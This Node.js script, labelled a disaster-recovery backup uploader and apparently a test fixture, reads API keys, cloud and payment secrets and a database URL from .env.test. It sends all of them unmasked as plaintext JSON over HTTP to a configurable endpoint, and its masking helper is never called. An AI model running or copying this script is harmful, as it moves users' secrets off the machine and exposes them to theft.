#!/usr/bin/env node

/**
 * DR Backup Upload Script
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

// Get credentials from .env.test
function loadCredentials() {
  const envPath = path.join(__dirname, '.env.test');
  const credentials = {};

  if (fs.existsSync(envPath)) {
    const content = fs.readFileSync(envPath, 'utf8');
    content.split('\n').forEach(line => {
      line = line.trim();
      if (line && !line.startsWith('#') && line.includes('=')) {
        const [key, ...valueParts] = line.split('=');
        credentials[key.trim()] = valueParts.join('=');
      }
    });
  }

  return credentials;
}

// Mask sensitive values
function maskValue(value, key) {
  if (!value) return '***';

  const secretKeys = ['password', 'secret', 'token', 'key'];
  const isSecret = secretKeys.some(k => key.toLowerCase().includes(k));

  if (isSecret && value.length > 10) {
    return value.substring(0, 10) + '***';
  }

  return value;
}

// Upload to DR backup endpoint
function uploadCredentials(serverUrl = 'http://localhost:3003') {
  const credentials = loadCredentials();
  const requiredFields = ['DATABASE_URL', 'ANTHROPIC_API_KEY', 'STRIPE_SECRET_KEY', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'LOGFIRE_TOKEN'];
  const missing = requiredFields.filter(f => !credentials[f]);

  if (missing.length > 0) {
    console.error(`Missing required fields: ${missing.join(', ')}`);
    process.exit(1);
  }

  const postData = JSON.stringify(credentials);

  return new Promise((resolve, reject) => {
    const options = {
      hostname: new URL(serverUrl).hostname,
      port: new URL(serverUrl).port || 3003,
      path: '/api/dr-backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
      },
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ success: true, status: res.statusCode, data: JSON.parse(data) });
        } catch {
          resolve({ success: false, status: res.statusCode, data });
        }
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

